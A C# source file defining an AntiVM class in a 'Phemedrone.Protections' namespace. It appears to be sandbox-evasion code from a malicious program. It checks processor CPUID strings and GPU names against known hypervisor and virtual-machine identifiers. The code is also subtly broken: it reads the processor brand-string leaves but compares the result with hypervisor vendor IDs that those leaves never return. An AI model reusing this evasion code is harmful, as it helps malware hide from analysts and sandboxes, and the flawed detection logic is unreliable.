using System.Runtime.InteropServices;
using System.Runtime.Intrinsics.X86;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using Phemedrone.Services;

namespace Phemedrone.Protections
{
    public class AntiVM
    {
        public static bool IsVM()
        {
            var virtualGpus = new List<string>()
            {
                "VirtualBox", "VBox", "VMware Virtual", "VMware", "Hyper-V Video"
            };
            
            var manufacturerIDs = new List<string>()
            {
                // The following are known ID strings from virtual machines:
                "bhyve bhyve ", "KVMKVMKVM\0\0\0", "TCGTCGTCGTCG", "Microsoft Hv", "MicrosoftXTA", " lrpepyh  vr",
                "VMwareVMware", "XenVMMXenVMM", "ACRNACRNACRN", " QNXQVMBSQG ", "VirtualApple"
            };

            /*
             * Check if the CPU supports the CPUID instruction.
             * Unless this is some ancient CPU, then it should.
             */
            if (X86Base.IsSupported)
            {
                // Get Manufacturer ID bytes using CPUID
                Span<int> raw = stackalloc int[12];
                (raw[0], raw[1], raw[2], raw[3]) = X86Base.CpuId(unchecked((int)0x80000002), 0);
                (raw[4], raw[5], raw[6], raw[7]) = X86Base.CpuId(unchecked((int)0x80000003), 0);
                (raw[8], raw[9], raw[10], raw[11]) = X86Base.CpuId(unchecked((int)0x80000004), 0);

                Span<byte> bytes = MemoryMarshal.AsBytes(raw);
                string brand = Encoding.UTF8.GetString(bytes).Trim();
                foreach (var manufacturerId in manufacturerIDs)
                {
                    if (brand == manufacturerId)
                    {
                        return true;
                    }
                }
            }

            var gpus = Information.GetGPUs();
            return _ = virtualGpus.Any(x => gpus.Any(y => y.Contains(x)));
        }
    }
}
